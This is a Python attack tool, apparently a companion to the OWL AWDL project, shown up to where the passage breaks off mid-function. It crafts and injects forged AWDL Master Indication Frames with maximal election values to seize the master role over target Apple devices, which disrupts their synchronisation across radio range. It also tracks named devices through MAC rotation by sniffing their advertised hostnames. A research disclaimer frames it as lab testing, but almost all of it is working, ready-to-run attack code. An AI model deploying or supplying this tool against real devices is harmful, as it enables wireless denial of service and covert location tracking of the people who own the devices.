#!/usr/bin/env python3
# OWL: an open Apple Wireless Direct Link (AWDL) implementation
# Copyright (C) 2018  The Open Wireless Link Project
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""Craft and inject AWDL Master Indication Frames (MIF) that win the election.

This is a research / testing companion for the OWL (Open Wireless Link)
project.  It builds AWDL action frames byte-for-byte compatible with the
frames produced by ``src/tx.c`` and injects them on a monitor-mode Wi-Fi
interface, directed at one specific destination MAC address.

The frames carry Election Parameters (v1 *and* v2) with a maximal election
*counter* and *metric*.  Per AWDL's election rule -- reimplemented in
``src/election.c`` (``awdl_election_compare_master``: compare the master
counter first, then the master metric, higher wins) -- a node advertising a
higher counter can never be out-voted by a peer whose counter starts at 0 and
only increments once every ~3.14 s.  The injected node therefore *guarantees*
it becomes (and stays) the AWDL master / sync root that the target
synchronises to.

How the target is made to accept us as a valid peer (see
``awdl_peer_is_valid`` in ``src/peers.c``: ``sent_mif && devclass &&
version``):
  * we send a MIF (action subtype 3)            -> sets ``sent_mif``
  * we include a Version TLV (type 21)          -> sets ``version`` + ``devclass``
  * we include an Election Parameters v2 TLV     -> drives the election

================================  AUTHORISED USE  ============================
AWDL is an always-on protocol on Apple devices.  Forcing a foreign master
disrupts the synchronisation of every node in radio range, so run this ONLY
against devices you own or are explicitly authorised to test, in an isolated
RF lab environment.  This mirrors the attacks studied by the OWL authors in
"A Billion Open Interfaces for Eve and Mallory" (USENIX Security '19).  Like
the rest of OWL it is experimental software -- use it at your own risk.
=============================================================================

Requirements: Linux, Python 3.6+, root, and a Wi-Fi card in monitor mode on
the right social channel (6, 44 or 149).  No third-party modules needed.

Example:
    # Let the tool prepare the card (clean plain monitor + regulatory domain)
    # and inject in one go:
    sudo ./awdl_master_inject.py -i wlan0 -t 11:22:33:44:55:66 -c 44 --setup

    # ...or prepare the card yourself first (see tools/awdl_prepare_stick.sh):
    #   sudo ./awdl_prepare_stick.sh wlan0 44
    sudo ./awdl_master_inject.py -i wlan0 -t 11:22:33:44:55:66 -c 44

    # Follow a device by its (stable) AWDL hostname instead of a MAC: Apple
    # devices rotate their MAC, so --track resolves the name to the current MAC
    # by sniffing and re-targets automatically as it rotates:
    sudo ./awdl_master_inject.py -i wlan0 --track "Peters-iPad" -c 6 --setup

Integration:
    The injection loop reads every live parameter (targets, source, election
    counter, channel, ...) from a ``ParamStore`` before building each frame, so
    other code can drive it by mutating that store instead of restarting it.
    ``targets`` is a list, so one or many destination MACs are supported::

        import threading, awdl_master_inject as awdl
        store = awdl.ParamStore(targets=[awdl.parse_mac("ff:ff:ff:ff:ff:ff")],
                                source=awdl.parse_mac("de:ad:be:ef:00:01"),
                                channel=6, master_metric=awdl.UINT32_MAX,
                                master_counter=awdl.MASTER_COUNTER_BASE,
                                self_metric=awdl.UINT32_MAX,
                                self_counter=awdl.MASTER_COUNTER_BASE,
                                awdl_version=0xa0, hostname="owl-master",
                                devclass=awdl.DEVCLASS_NAMES["macos"],
                                aw_offset=0)
        sock = awdl.open_injection_socket("wlan0")
        builder = awdl.AwdlFrameBuilder(src=store.get("source"),
                                        dst=store.get("targets")[0], channel=6,
                                        master_metric=awdl.UINT32_MAX,
                                        master_counter=awdl.MASTER_COUNTER_BASE,
                                        self_metric=awdl.UINT32_MAX,
                                        self_counter=awdl.MASTER_COUNTER_BASE,
                                        hostname="owl-master",
                                        devclass=awdl.DEVCLASS_NAMES["macos"])
        stop = threading.Event()
        threading.Thread(target=awdl.run_injection,
                         args=(sock, store, builder, "wlan0"),
                         kwargs=dict(interval=0.11, stop=stop)).start()
        store.update(targets=[awdl.parse_mac("66:aa:30:33:93:af"),  # live change
                              awdl.parse_mac("66:aa:30:33:93:b0")])
        stop.set()                                                # and stop
"""

import argparse
import errno
import fcntl
import os
import random
import shutil
import signal
import socket
import struct
import subprocess
import sys
import threading
import time

# ---------------------------------------------------------------------------
# AWDL / IEEE 802.11 constants (kept in sync with src/*.h)
# ---------------------------------------------------------------------------

AWDL_OUI = b"\x00\x17\xf2"                       # src/frame.h  AWDL_OUI
AWDL_BSSID = b"\x00\x25\x00\xff\x94\x73"         # src/frame.h  AWDL_BSSID
AWDL_TYPE = 8                                    # src/frame.h  AWDL_TYPE
AWDL_VERSION_COMPAT = 0x10                       # awdl_version(1, 0)
AWDL_VERSION_TLV_DEFAULT = 0xa0                  # Version TLV default: 10.0 (modern iOS/macOS)
IEEE80211_VENDOR_SPECIFIC = 127

# Action subtypes (enum awdl_action_type)
AWDL_ACTION_PSF = 0
AWDL_ACTION_MIF = 3

# TLV type values (enum awdl_tlvs)
AWDL_SYNCHRONIZATON_PARAMETERS_TLV = 4
AWDL_ELECTION_PARAMETERS_TLV = 5
AWDL_SERVICE_PARAMETERS_TLV = 6
AWDL_ENHANCED_DATA_RATE_CAPABILITIES_TLV = 7
AWDL_DATA_PATH_STATE_TLV = 12
AWDL_ARPA_TLV = 16
AWDL_CHAN_SEQ_TLV = 18
AWDL_VERSION_TLV = 21
AWDL_ELECTION_PARAMETERS_V2_TLV = 24

# 802.11 frame control: management + action (src/ieee80211.h)
IEEE80211_FTYPE_MGMT = 0x0000
IEEE80211_STYPE_ACTION = 0x00D0
FRAME_CONTROL_ACTION = IEEE80211_FTYPE_MGMT | IEEE80211_STYPE_ACTION

# Channel sequence (src/channel.{c,h})
AWDL_CHANSEQ_LENGTH = 16
AWDL_CHAN_ENC_OPCLASS = 3

# Social channels -> (channel number, operating class) as in CHAN_OPCLASS_*
CHAN_OPCLASS = {
    6:   (6,   0x51),
    44:  (44,  0x80),
    149: (149, 0x80),
}

# Device classes (enum awdl_devclass)
AWDL_DEVCLASS_MACOS = 1
AWDL_DEVCLASS_IOS = 2
AWDL_DEVCLASS_TVOS = 8

# Sync defaults (src/sync.c  awdl_sync_state_init / src/state.c)
AW_PERIOD_TU = 16
PRESENCE_MODE = 4
PSF_INTERVAL_MASTER_TU = 110

UINT32_MAX = 0xFFFFFFFF
MASTER_COUNTER_BASE = 0x40000000  # start high; advance so the master stays live
MASTER_COUNTER_STEP = 1

BROADCAST = b"\xff\xff\xff\xff\xff\xff"

# The only channels AWDL ever uses (the "social" channels), swept in this order
# when no channel is given explicitly.
AWDL_SOCIAL_CHANNELS = [6, 44, 149]
SWEEP_DWELL_DEFAULT = 3.0        # seconds listened on each channel while sweeping
CHANNEL_DWELL_DEFAULT = 1.0      # seconds injected on each channel while rotating
SOCKET_TIMEOUT = 0.5             # seconds for all socket operations (allows Ctrl+C)

ETH_P_ALL = 0x0003               # receive every frame on the monitor interface

# The driver TX queue can transiently fill up (send() raises EAGAIN/ENOBUFS),
# common with USB Wi-Fi adapters. Retry a bounded number of times with a short
# back-off instead of dropping the frame.
TX_RETRY_MAX = 10
TX_RETRY_DELAY = 0.0005          # 500 us between retries


# ---------------------------------------------------------------------------
# small helpers
# ---------------------------------------------------------------------------

def parse_mac(text):
    """Parse ``aa:bb:cc:dd:ee:ff`` (or ``-``/``.`` separated) into 6 bytes."""
    cleaned = text.replace("-", ":").replace(".", ":").strip()
    parts = cleaned.split(":")
    if len(parts) != 6:
        raise argparse.ArgumentTypeError("MAC address must have 6 octets: %r" % text)
    try:
        octets = bytes(int(p, 16) for p in parts)
    except ValueError:
        raise argparse.ArgumentTypeError("invalid hex in MAC address: %r" % text)
    return octets


def parse_macs(text):
    """Parse one or more comma-separated MAC addresses into a list of 6-byte
    values (each accepts the same formats as ``parse_mac``)."""
    macs = []
    for part in str(text).split(","):
        part = part.strip()
        if not part:
            continue
        macs.append(parse_mac(part))
    if not macs:
        raise argparse.ArgumentTypeError("no MAC address given")
    return macs


def parse_names(text):
    """Parse one or more comma-separated hostnames into a list of strings."""
    names = [part.strip() for part in str(text).split(",")]
    names = [n for n in names if n]
    if not names:
        raise argparse.ArgumentTypeError("no hostname given")
    return names


def mac_str(raw):
    return ":".join("%02x" % b for b in raw)


def get_iface_mac(ifname):
    """Return the hardware address of ``ifname`` as 6 bytes, or None."""
    try:
        with open("/sys/class/net/%s/address" % ifname) as fh:
            return parse_mac(fh.read().strip())
    except (OSError, argparse.ArgumentTypeError):
        return None


def random_local_mac():
    """A random locally-administered, unicast MAC (bit0=0 unicast, bit1=1 local)."""
    first = (random.randint(0, 255) & 0xFC) | 0x02
    return bytes([first] + [random.randint(0, 255) for _ in range(5)])


def usec_to_tu(usec):
    return usec // 1024


# 1 TU (time unit) = 1024 us, per IEEE 802.11 (src/ieee80211.h)
_TIME_UNITS = {"us": 1e-6, "ms": 1e-3, "tu": 1024e-6, "s": 1.0}


def parse_duration(text):
    """Parse a time value into seconds.

    Accepts a bare number (seconds) or a value with a unit suffix:
    ``s`` (seconds), ``ms`` (milliseconds), ``us`` (microseconds) or
    ``tu`` (802.11 time units, 1 TU = 1024 us).  Examples: ``0.5``,
    ``500ms``, ``110tu``.
    """
    token = str(text).strip().lower()
    multiplier = 1.0
    for suffix in ("ms", "us", "tu", "s"):   # check two-char suffixes before "s"
        if token.endswith(suffix) and token[:-len(suffix)]:
            multiplier = _TIME_UNITS[suffix]
            token = token[:-len(suffix)]
            break
    try:
        value = float(token)
    except ValueError:
        raise argparse.ArgumentTypeError("invalid time value: %r" % text)
    if value < 0:
        raise argparse.ArgumentTypeError("time value must not be negative: %r" % text)
    return value * multiplier


def parse_channels(text):
    """Parse a comma-separated channel list like ``6,44,149`` into ints.

    Each channel must be a supported AWDL social channel.
    """
    chans = []
    for part in str(text).split(","):
        part = part.strip()
        if not part:
            continue
        try:
            ch = int(part)
        except ValueError:
            raise argparse.ArgumentTypeError("invalid channel: %r" % part)
        if ch not in CHAN_OPCLASS:
            raise argparse.ArgumentTypeError(
                "unsupported channel %d (use %s)"
                % (ch, "/".join(str(c) for c in sorted(CHAN_OPCLASS))))
        if ch not in chans:
            chans.append(ch)
    if not chans:
        raise argparse.ArgumentTypeError("no channels given")
    return chans


def parse_awdl_version(text):
    """Parse ``MAJOR.MINOR`` (e.g. ``10.0``) or a raw byte (e.g. ``0xa0``).

    Returns the single-byte encoding ``(major << 4) | minor`` used in the
    Version TLV, where each nibble is 0-15.
    """
    token = str(text).strip()
    if "." in token:
        major_s, _, minor_s = token.partition(".")
        try:
            major, minor = int(major_s), int(minor_s)
        except ValueError:
            raise argparse.ArgumentTypeError("invalid AWDL version: %r" % text)
    else:
        try:
            value = int(token, 0)
        except ValueError:
            raise argparse.ArgumentTypeError("invalid AWDL version: %r" % text)
        major, minor = (value >> 4) & 0xF, value & 0xF
    if not (0 <= major <= 0xF and 0 <= minor <= 0xF):
        raise argparse.ArgumentTypeError(
            "AWDL version out of range (0.0-15.15): %r" % text)
    return ((major << 4) & 0xF0) | (minor & 0x0F)


# ---------------------------------------------------------------------------
# frame construction (mirrors src/tx.c)
# ---------------------------------------------------------------------------

class AwdlFrameBuilder:
    """Builds AWDL action frames identical in layout to ``src/tx.c``."""

    def __init__(self, src, dst, channel, master_metric, master_counter,
                 self_metric, self_counter, hostname, devclass,
                 aw_period=AW_PERIOD_TU, af_period=PSF_INTERVAL_MASTER_TU,
                 presence_mode=PRESENCE_MODE, aw_offset=0,
                 awdl_version=AWDL_VERSION_TLV_DEFAULT):
        self.src = src
        self.dst = dst
        self.channel = channel
        self.master_metric = master_metric & UINT32_MAX
        self.master_counter = master_counter & UINT32_MAX
        self.self_metric = self_metric & UINT32_MAX
        self.self_counter = self_counter & UINT32_MAX
        self.hostname = hostname
        self.devclass = devclass
        self.awdl_version = awdl_version & 0xFF   # advertised in the Version TLV

        # AWDL timing parameters advertised in the Sync Parameters TLV.
        self.aw_period = aw_period            # Availability Window period (TU)
        self.af_period = af_period            # action-frame / PSF period (TU)
        self.presence_mode = presence_mode    # EAW multiplier (steps per EAW)
        self.aw_offset = aw_offset            # AW phase offset in TU (may be <0)

        # We advertise ourselves as the top master: distance 0, master == self.
        self.master_addr = src
        self.sync_addr = src
        self.height = 0

        self._seq = 0                       # 802.11 sequence number (12 bit)
        self._t0 = time.monotonic_ns() // 1000  # us reference (like clock_time_us)

    # -- radiotap ----------------------------------------------------------
    @staticmethod
    def _radiotap_header():
        # Matches ieee80211_init_radiotap_header(): present = RATE bit (1<<2),
        # one rate byte = 2 * 12 = 24 (i.e. 12 Mbit/s).  Total length 9.
        present = 1 << 2            # IEEE80211_RADIOTAP_RATE
        rate = 2 * 12
        hdr = struct.pack("<BBHI", 0, 0, 9, present)
        return hdr + struct.pack("<B", rate)

    # -- 802.11 + action headers ------------------------------------------
    def _ieee80211_hdr(self):
        seq_ctrl = (self._seq & 0x0FFF) << 4
        self._seq = (self._seq + 1) & 0x0FFF
        return struct.pack("<HH", FRAME_CONTROL_ACTION, 0) + \
            self.dst + self.src + AWDL_BSSID + struct.pack("<H", seq_ctrl)

    def _awdl_action(self, subtype):
        steady = (time.monotonic_ns() // 1000) & UINT32_MAX
        return struct.pack("<B3sBBBBII",
                           IEEE80211_VENDOR_SPECIFIC, AWDL_OUI, AWDL_TYPE,
                           AWDL_VERSION_COMPAT, subtype, 0, steady, steady)

    # -- channel sequence block (awdl_init_chanseq) -----------------------
    def _chanseq_block(self):
        chan_num, opclass = CHAN_OPCLASS[self.channel]
        block = struct.pack("<BBBBH",
                            AWDL_CHANSEQ_LENGTH - 1,    # count (+1)
                            AWDL_CHAN_ENC_OPCLASS,      # encoding
                            0,                          # duplicate_count
                            self.presence_mode - 1,     # step_count (presence_mode-1)
                            0xFFFF)                     # fill_channel
        entry = bytes([chan_num, opclass])              # opclass encoding = 2 bytes
        return block + entry * AWDL_CHANSEQ_LENGTH

    # -- Synchronization Parameters TLV (type 4) --------------------------
    def _sync_params_tlv(self):
        now = time.monotonic_ns() // 1000
        chan_num, _ = CHAN_OPCLASS[self.channel]

        eaw_period = self.presence_mode * self.aw_period
        # The AW phase offset shifts the countdown to the next AW and the AW
        # sequence counter consistently, steering the availability-window phase
        # a receiver re-synchronises to once we have become its master.  The
        # receiver (awdl_handle_sync_params_tlv in src/rx.c) reads our
        # time_to_next_aw and aw_counter and re-aligns its own clock to them.
        time_since = usec_to_tu(now - self._t0) + self.aw_offset
        tx_down_counter = eaw_period - (time_since % eaw_period)
        current_aw = (0 + (time_since % eaw_period) // self.aw_period +
                      self.presence_mode * (time_since // eaw_period)) & 0xFFFF

        aw_com_length = self.aw_period
        consumed = self.aw_period * self.presence_mode - tx_down_counter
        remaining = 0 if aw_com_length < consumed else aw_com_length - consumed

        body = struct.pack(
            "<BHBBH"     # next_aw_channel, tx_down_counter, master_channel, guard_time, aw_period
            "HHHHH"      # af_period, flags, aw_ext_length, aw_com_length, remaining_aw_length
            "BBBB"       # min_ext, max_ext_multicast, max_ext_unicast, max_ext_af
            "6sBBHH",    # master_addr, presence_mode, reserved, next_aw_seq, ap_alignment
            chan_num,                       # next_aw_channel
            tx_down_counter & 0xFFFF,
            chan_num,                       # master_channel
            0,                              # guard_time
            self.aw_period,                 # aw_period
            self.af_period,                 # af_period
            0x1800,                         # flags
            self.aw_period,                 # aw_ext_length
            aw_com_length,                  # aw_com_length
            remaining & 0xFFFF,             # remaining_aw_length
            self.presence_mode - 1,         # min_ext
            self.presence_mode - 1,         # max_ext_multicast
            self.presence_mode - 1,         # max_ext_unicast
            self.presence_mode - 1,         # max_ext_af
            self.master_addr,               # master_addr (== self, we are master)
            self.presence_mode,             # presence_mode
            0,                              # reserved
            current_aw,                     # next_aw_seq
            current_aw,                     # ap_alignment
        )
        body += self._chanseq_block()
        body += b"\x00\x00"                 # padding (tx.c)
        return self._tlv(AWDL_SYNCHRONIZATON_PARAMETERS_TLV, body)

    # -- Election Parameters TLV v1 (type 5) ------------------------------
    def _election_params_tlv(self):
        body = struct.pack(
            "<BHBB6sII",
            0,                      # flags
            0,                      # id
            self.height,            # distancetop
            0,                      # unknown
            self.master_addr,       # top_master_addr
            self.master_metric,     # top_master_metric
            self.self_metric,       # self_metric
        ) + b"\x00\x00"            # pad[2]
        return self._tlv(AWDL_ELECTION_PARAMETERS_TLV, body)

    # -- Election Parameters TLV v2 (type 24) -- THE DECIDING TLV ----------
    def _election_params_v2_tlv(self):
        # Field order & offsets match struct awdl_election_params_v2_tlv and
        # the reader awdl_handle_election_params_v2_tlv() in src/rx.c.
        body = struct.pack(
            "<6s6sIIIIIII",
            self.master_addr,       # master_addr
            self.sync_addr,         # sync_addr
            self.master_counter,    # master_counter  (compared FIRST -> max)
            self.height,            # distance_to_master (0 -> we are the root)
            self.master_metric,     # master_metric   (compared SECOND -> max)
            self.self_metric,       # self_metric
            0,                      # unknown
            0,                      # reserved
            self.self_counter,      # self_counter
        )
        return self._tlv(AWDL_ELECTION_PARAMETERS_V2_TLV, body)

    # -- Channel Sequence TLV (type 18) -----------------------------------
    def _chanseq_tlv(self):
        body = self._chanseq_block() + b"\x00\x00\x00"   # 3 padding bytes (tx.c)
        return self._tlv(AWDL_CHAN_SEQ_TLV, body)

    # -- Service Parameters TLV (type 6) ----------------------------------
    def _service_params_tlv(self):
        body = struct.pack("<3sHI", b"\x00\x00\x00", 0, 0)
        return self._tlv(AWDL_SERVICE_PARAMETERS_TLV, body)

    # -- HT Capabilities TLV (type 7) -------------------------------------
    def _ht_capabilities_tlv(self):
        body = struct.pack("<HHBBH", 0, 0x11ce, 0x1b, 0xff, 0)
        return self._tlv(AWDL_ENHANCED_DATA_RATE_CAPABILITIES_TLV, body)

    # -- Arpa (hostname) TLV (type 16) ------------------------------------
    def _arpa_tlv(self):
        name = self.hostname.encode("utf-8")[:63]
        body = struct.pack("<BB", 3, len(name)) + name + struct.pack(">H", 0xc00c)
        return self._tlv(AWDL_ARPA_TLV, body)

    # -- Data Path State TLV (type 12) ------------------------------------
    def _data_path_state_tlv(self):
        if self.channel == 6:
            social = 0x0001
        elif self.channel == 44:
            social = 0x0002
        else:                      # 149
            social = 0x0004
        body = struct.pack("<H3sH6sH",
                           0x8f24,              # flags
                           b"X0\x00",           # country_code
                           social,              # social_channels
                           self.src,            # awdl_addr
                           0x0000)              # ext_flags
        return self._tlv(AWDL_DATA_PATH_STATE_TLV, body)

    # -- Version TLV (type 21) -- needed to make the peer "valid" ----------
    def _version_tlv(self):
        body = struct.pack("<BB", self.awdl_version, self.devclass)
        return self._tlv(AWDL_VERSION_TLV, body)

    # -- generic TLV header ------------------------------------------------
    @staticmethod
    def _tlv(tlv_type, body):
        return struct.pack("<BH", tlv_type, len(body)) + body

    # -- full frame --------------------------------------------------------
    def build(self, subtype=AWDL_ACTION_MIF):
        """Assemble a complete injectable frame (radiotap + 802.11 + AWDL)."""
        frame = self._radiotap_header()
        frame += self._ieee80211_hdr()
        frame += self._awdl_action(subtype)
        frame += self._sync_params_tlv()
        frame += self._election_params_tlv()
        frame += self._chanseq_tlv()
        frame += self._election_params_v2_tlv()
        frame += self._service_params_tlv()
        if subtype == AWDL_ACTION_MIF:
            frame += self._ht_capabilities_tlv()
            frame += self._arpa_tlv()
        frame += self._data_path_state_tlv()
        frame += self._version_tlv()
        # No FCS: OWL injects with ieee80211_state->fcs == 0; mac80211 adds it.
        return frame


# ---------------------------------------------------------------------------
# live parameter store ("Zwischenspeicher")
# ---------------------------------------------------------------------------

class ParamStore:
    """Thread-safe store of the live injection parameters.

    The injection loop reads a fresh snapshot from this store *before building
    every frame*, so other code -- another thread or another module that
    ``import``s this file -- can change the targets, source, election counter,
    channel, ... at runtime and have the very next injected frame pick the new
    values up.  This is the integration seam: drive the injector by mutating a
    ``ParamStore`` instead of restarting it.

    All access is guarded by a lock, so updates from another thread are atomic
    with respect to the snapshot the loop takes.

    Fields:
        targets         list of destination MACs (each 6 bytes); one frame is
                        sent to every target in the list per cycle
        source          source / advertised-master MAC (6 bytes)
        channel         AWDL social channel (6/44/149); changing it re-tunes
                        the radio on the next cycle (single-channel mode)
        master_metric   election master metric (compared second, higher wins)
        master_counter  election master counter (compared first, higher wins);
                        advanced automatically every frame to stay "live"
        self_metric     own metric advertised in the election TLVs
        self_counter    own counter advertised in the election TLVs
        awdl_version    Version TLV byte, e.g. 0xa0 for 10.0
        hostname        hostname advertised in the Arpa TLV (str)
        devclass        device-class byte (see ``DEVCLASS_NAMES``)
        aw_offset       availability-window phase offset in TU
    """

    FIELDS = ("targets", "source", "channel", "master_metric", "master_counter",
              "self_metric", "self_counter", "awdl_version", "hostname",
              "devclass", "aw_offset")

    def __init__(self, **values):
        missing = [f for f in self.FIELDS if f not in values]
        if missing:
            raise TypeError("ParamStore missing parameter(s): %s"
                            % ", ".join(missing))
        unknown = [k for k in values if k not in self.FIELDS]
        if unknown:
            raise TypeError("ParamStore got unknown parameter(s): %s"
                            % ", ".join(unknown))
        self._lock = threading.Lock()
        self._v = dict(values)

    def update(self, **values):
        """Atomically change one or more parameters (call this from any thread)."""
        unknown = [k for k in values if k not in self.FIELDS]
        if unknown:
            raise KeyError("unknown parameter(s): %s" % ", ".join(unknown))
        with self._lock:
            self._v.update(values)

    def get(self, key):
        """Return the current value of one parameter."""
        with self._lock:
            return self._v[key]

    def snapshot(self):
        """Return an atomic copy of all current parameters as a plain dict."""
        with self._lock:
            return dict(self._v)

    def advance_counter(self, step, maximum=UINT32_MAX):
        """Atomically bump the election counters so the master stays "live".

        A frozen counter is detected by the victim as a stale (dead) master, so
        the loop advances it every frame.  ``self_counter`` is kept in lock-step
        with ``master_counter``.  Returns the new counter value.
        """
        with self._lock:
            new = min(self._v["master_counter"] + step, maximum)
            self._v["master_counter"] = new
            self._v["self_counter"] = new
            return new


def apply_snapshot(builder, snap):
    """Copy a :class:`ParamStore` snapshot into ``builder``'s live fields.

    The static timing parameters (aw/af period, presence mode) stay on the
    builder; everything a caller may want to vary per frame comes from ``snap``.
    The channel is handled by the loop (it has to re-tune the radio), and the
    destination is set per target by the loop, so neither is touched here.
    """
    builder.src = snap["source"]
    builder.master_addr = snap["source"]        # we advertise ourselves master
    builder.sync_addr = snap["source"]
    builder.master_metric = snap["master_metric"] & UINT32_MAX
    builder.master_counter = snap["master_counter"] & UINT32_MAX
    builder.self_metric = snap["self_metric"] & UINT32_MAX
    builder.self_counter = snap["self_counter"] & UINT32_MAX
    builder.awdl_version = snap["awdl_version"] & 0xFF
    builder.hostname = snap["hostname"]
    builder.devclass = snap["devclass"]
    builder.aw_offset = snap["aw_offset"]


class HostnameTracker:
    """Resolve AWDL device hostnames to their current MAC and keep a
    :class:`ParamStore`'s ``targets`` in sync as those MACs rotate.

    Apple devices rotate their Wi-Fi / AWDL MAC, but keep broadcasting a stable
    hostname (the Arpa TLV, e.g. ``"Peters-iPad"``) in their MIFs.  Give the
    hostname(s) to follow and the tracker rewrites ``store``'s ``targets`` to
    ``fixed + <currently-resolved MACs>`` whenever a tracked device first
    appears or its MAC changes -- so a rotated MAC never has to be re-entered.

    Matching is case-insensitive on the advertised hostname.  Pass the observed
    frames in via :meth:`observe` (``poll_rx`` does this during injection).
    """

    def __init__(self, store, fixed=(), names=()):
        self.store = store
        self.fixed = [bytes(m) for m in fixed]
        self.names = [n.lower() for n in names]
        self.resolved = {}       # hostname (lower-case) -> current MAC (bytes)
        self._apply()

    def observe(self, src, hostname):
        """Feed one observed ``(src MAC, hostname)``.

        Returns ``(hostname, old_mac_or_None, new_mac)`` when a tracked device's
        MAC changed (or it was seen for the first time), else ``None``.
        """
        if hostname is None:
            return None
        key = hostname.lower()
        if key not in self.names:
            return None
        src = bytes(src)
        old = self.resolved.get(key)
        if old == src:
            return None
        self.resolved[key] = src
        self._apply()
        return (hostname, old, src)

    def _apply(self):
        targets = list(self.fixed)
        for key in self.names:
            mac = self.resolved.get(key)
            if mac is not None and mac not in targets:
                targets.append(mac)
        self.store.update(targets=targets)

    def unresolved(self):
        """Tracked hostnames that have not been seen (resolved) yet."""
        return [n for n in self.names if n not in self.resolved]


# ---------------------------------------------------------------------------
# injection
# ---------------------------------------------------------------------------

def open_injection_socket(ifname):
    """Open a raw AF_PACKET socket bound to a monitor-mode interface.

    Opened with ETH_P_ALL so the same socket can both inject frames and sniff
    them (used by the channel sweep).
    """
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                             socket.htons(ETH_P_ALL))
        sock.bind((ifname, 0))
        sock.settimeout(SOCKET_TIMEOUT)
    except PermissionError:
        sys.exit("error: need root to open a raw socket (try sudo)")
    except OSError as exc:
        sys.exit("error: cannot bind to interface %r: %s" % (ifname, exc))
    return sock


def send_frame(sock, frame):
    """Inject one frame, retrying briefly when the driver TX queue is full.

    Returns True if the frame went out, False if it was dropped after the
    retry budget was exhausted.
    """
    for _ in range(TX_RETRY_MAX + 1):
        try:
            sock.send(frame)
            return True
        except socket.timeout:
            continue
        except OSError as exc:
            if exc.errno in (errno.EAGAIN, errno.EWOULDBLOCK, errno.ENOBUFS):
                time.sleep(TX_RETRY_DELAY)   # queue full; wait briefly and retry
                continue
            raise
    return False


def set_channel(ifname, channel):
    """Tune ``ifname`` to ``channel`` via ``iw``. Returns True on success."""
    try:
        subprocess.run(["iw", "dev", ifname, "set", "channel", str(channel)],
                       check=True, stdout=subprocess.DEVNULL,
                       stderr=subprocess.PIPE, timeout=5)
        return True
    except FileNotFoundError:
        print("    channel %d: cannot tune ('iw' not found)" % channel)
        return False
    except subprocess.TimeoutExpired:
        print("    channel %d: cannot tune (timeout)" % channel)
        return False
    except subprocess.CalledProcessError as exc:
        reason = exc.stderr.decode(errors="replace").strip() or "rejected"
        print("    channel %d: cannot tune (%s)" % (channel, reason))
        return False


def parse_awdl_info(buf):
    """Parse a received AWDL action frame once, extracting the fields the tool
    cares about.

    Returns a tuple ``(src, hostname, master_addr, self_counter)`` -- where
    ``hostname`` (from the Arpa TLV), ``master_addr`` and ``self_counter`` (from
    the Election Parameters v2 TLV) are ``None`` when that TLV is absent -- or
    ``None`` if the frame is not an AWDL action frame at all.
    """
    if len(buf) < 4:
        return None
    rt_len = struct.unpack_from("<H", buf, 2)[0]
    base = rt_len + 24                       # start of the AWDL action body
    if len(buf) < base + 16:
        return None
    frame_control = struct.unpack_from("<H", buf, rt_len)[0]
    if frame_control & 0x00FC != 0x00D0:     # mgmt + action
        return None
    body = buf[base:]
    if not (body[0] == IEEE80211_VENDOR_SPECIFIC and body[1:4] == AWDL_OUI
            and body[4] == AWDL_TYPE):
        return None
    src = buf[rt_len + 10:rt_len + 16]
    hostname = master_addr = self_counter = None
    tlvs = body[16:]                         # after the 16-byte awdl_action header
    i = 0
    while i + 3 <= len(tlvs):
        ttype = tlvs[i]
        tlen = struct.unpack_from("<H", tlvs, i + 1)[0]
        val = tlvs[i + 3:i + 3 + tlen]
        if ttype == AWDL_ELECTION_PARAMETERS_V2_TLV and len(val) >= 40:
            master_addr = val[0:6]
            self_counter = struct.unpack_from("<I", val, 36)[0]
        elif ttype == AWDL_ARPA_TLV and len(val) >= 2:
            # body layout (src/frame.h): flags(1) name_length(1) name suffix(2)
            nlen = val[1]
            name = val[2:2 + nlen]
            if nlen and len(name) == nlen:
                hostname = name.decode("utf-8", "replace")
        i += 3 + tlen
    return (src, hostname, master_addr, self_counter)


def poll_rx(sock, our_src, watch_state=None, tracker=None):
    """Drain buffered RX frames once (non-blocking).

    Feeds every observed AWDL hostname to ``tracker`` (if given) so it can
    follow MAC rotations, and records each peer's advertised master in
    ``watch_state`` (if given; frames from our own source are skipped). Returns
    the rotation changes the tracker detected this call, as a list of
    ``(hostname, old_mac_or_None, new_mac)`` tuples.
    """
    changes = []
    sock.setblocking(False)
    try:
        while True:
            try:
                buf = sock.recv(4096)
            except (BlockingIOError, OSError, socket.timeout):
                break
            info = parse_awdl_info(buf)
            if info is None:
                continue
            psrc, hostname, maddr, sctr = info
            if tracker is not None and hostname is not None:
                change = tracker.observe(psrc, hostname)
                if change is not None:
                    changes.append(change)
            if watch_state is not None and maddr is not None \
                    and bytes(psrc) != bytes(our_src):
                watch_state[mac_str(psrc)] = (mac_str(maddr), sctr,
                                              time.monotonic())
    finally:
        sock.setblocking(True)
    return changes


def watch_report(state, our_src_str):
    """Print one line per known peer; prune entries not seen for 15 s."""
    now = time.monotonic()
    to_delete = []
    for peer in sorted(state):
        maddr, sctr, seen = state[peer]
        if now - seen > 15:
            to_delete.append(peer)
            continue
        tag = "  <== ADOPTED YOU" if maddr == our_src_str else ""
        print("    [watch] %s -> master %s (self_counter=%s)%s"
              % (peer, maddr, sctr, tag))
    for peer in to_delete:
        del state[peer]


def _drain(sock):
    """Discard any buffered frames so a sweep window only counts fresh ones."""
    sock.setblocking(False)
    try:
        while True:
            try:
                sock.recv(4096)
            except (BlockingIOError, OSError, socket.timeout):
                pass
            break
    finally:
        sock.setblocking(True)


def sweep_for_channel(sock, ifname, targets, names, channels, dwell):
    """Listen on each candidate channel and return the one with the most AWDL
    frames from any of ``targets`` (MACs) or ``names`` (hostnames), or None if
    none is seen anywhere."""
    target_set = {bytes(t) for t in targets}
    name_set = {n.lower() for n in names}
    wanted = [mac_str(t) for t in targets] + list(names)
    print("[*] sweeping for %s on channels %s (%.1fs each)"
          % (", ".join(wanted), ",".join(str(c) for c in channels), dwell))
    counts = {}
    for ch in channels:
        if not set_channel(ifname, ch):
            continue
        time.sleep(0.2)             # let the radio settle on the new channel
        _drain(sock)
        n = 0
        end = time.monotonic() + dwell
        while time.monotonic() < end:
            try:
                buf = sock.recv(4096)
            except socket.timeout:
                continue
            except OSError:
                break
            info = parse_awdl_info(buf)
            if info is None:
                continue
